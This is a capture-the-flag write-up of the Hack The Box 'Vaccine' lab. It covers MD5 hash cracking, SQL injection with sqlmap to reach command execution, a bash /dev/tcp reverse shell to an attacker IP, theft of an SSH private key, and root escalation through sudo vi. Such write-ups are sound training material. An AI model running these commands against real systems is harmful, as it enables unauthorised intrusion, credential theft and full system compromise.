Author: Samibare  
2026-6-13  
**HTB Starting point \- Vaccine** 			

---

**TLDR**

The challenge required me to 

Log in as admin  
Gain webshell through SQL injection   
Upgrading to a reverse shell.  
Find SSH credential  
Connect via SSH  
Find a program that you can run as root  
Utilize it to escalate the shell to root

**Logging in as admin:**

The program had a hard-coded credential. The password was in MD5, but since MD5 is considered a broken hash, we can utilize John the Ripper and RockYou to crack it. MD5 is considered broken as it is fast to compute and it is vulnerable to collision. Therefore, it is cryptographically broken and performing a brute force is a viable option.

john \--format=raw-md5 –wordlist=/usr/share/wordlist/rockyou.txt hash.txt

**Gaining webshell:**

When logged in, we can see that we can interact with a SQL database through the search variable

\\dashboard.php?search=

We then use SQLmap along with the cookie we get assigned when logging in as an admin

sqlmap \-u [http://MACHINE\_IP/dashboard.php?search=1](http://MACHINE_IP/dashboard.php?search=1) –cookie=”PHPSESSID=SESSID”

The sqlmap detects that the website is running postgresql backend and uses COPY TO PROGRAM to achieve command execution, spawning a pseudo-shell through the injection point.

**Upgrading the shell:**

On our machine we can use netcat to listen for an event

nc \-lvnp 4444

Then on the sqlmap webshell, 

bash \-c ‘bash \-i \>& /dev/tcp/YOUR\_IP/4444 0\>&1’

With this, we upgrade the shell from webshell to reverse shell. 

Note: As we find the credential for SSH I did not stabilize the shell. However, it is best practice to stabilize the shell as soon as possible. To stabilize a shell,

\#Spawns Pseudo-teletype  
python3 \-c ‘import pty; pty.spawn(“/bin/bash”)’

\#Temporary exit to our shell through ctrl+z  
\#then we stop our terminal from intercepting the keystrokes and stop it from echoing the input back.  
stty raw \-echo

\#Bring the netcat to foreground  
fg

\#Lastly we set the terminal dimension in our shell  
export TERM=xterm  
\#Use the size of your terminal  
stty rows \# cols \# 

**Find SSH credentials:**   
When listing all files in the /var/lib/postgresql,   
ls \-a  
We see a hidden directory, .ssh  
Going into the directory, there are SSH credentials for postgres, including the private key in id\_rsa.  
We can then copy this over to our machine to id\_rsa. Though, we need to change the file permission,

chmod 600 id\_rsa

As the SSH will reject the key with open permission.

**Connect via SSH:**

The SSH will allow us to directly interact with the shell as the postgres user without having to enter or know the password.

**Finding a program that can be run as root:**

To see what we can run as root, we would like to run 

sudo \-l 

However, we need a password for PostgreSQL.

The password is also hardcoded in the dashboard.php.   
By viewing the dashboard.php, we can get the password.

We can then run 

sudo \-l \-S 

The \-S flag prompts the user to input their password. 

After inputting the password, it shows that we can run vi with sudo on a certain configuration file.

**Utilizing it to escalate to the root:**

By running vi as a sudo, the sudo set the RUID and EUID to both 0\. Inside vi, we can type :\!/bin/bash to create a root shell. Logically, vi calls popen(“/bin/bash”). As the popen() internally calls fork() to create a child with the same RUID and EUID. Then it calls execve() to replace the child with a bash with the same UID as the child process. This allows for the bash to pass the mismatch check as RUID=EUID=0, allowing for the bash to keep the EUID of 0 instead of dropping it. This results in the user being able to run arbitrary code with root privileged bash.

From here, we just read the root.txt file to get the flag

cat /root/root.txt.  
